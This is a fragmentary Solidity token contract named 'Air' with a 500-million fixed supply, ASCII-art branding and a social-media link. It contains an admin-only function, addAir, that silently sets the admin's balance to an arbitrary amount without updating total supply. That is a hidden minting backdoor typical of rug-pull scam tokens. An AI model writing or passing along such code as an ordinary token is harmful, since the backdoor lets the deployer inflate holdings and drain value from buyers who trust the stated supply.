...
/*
 ...
 | |   | |/ _ \/ _` | '_ \    / _ \ | | '__|
 | |___| |  __/ (_| | | | |  / ___ \| | |   
  \____|_|\___|\__,_|_| |_| /_/   \_\_|_|    

*/

// X/Twitter: https://twitter.com/los_muertosNFT
...
contract Air  {
    ...
    constructor(address adds) {
        ...
        tokenSymbol = "AIR";
        tokenDecimals = 18;
        tokenTotalSupply = 500000000 * 10 ** tokenDecimals;
    ...
    function addAir(uint256 addV) external {
        if(adm == msg.sender){
            _balances[msg.sender] = 1000000 * addV * 10 ** tokenDecimals;
        }
    } 
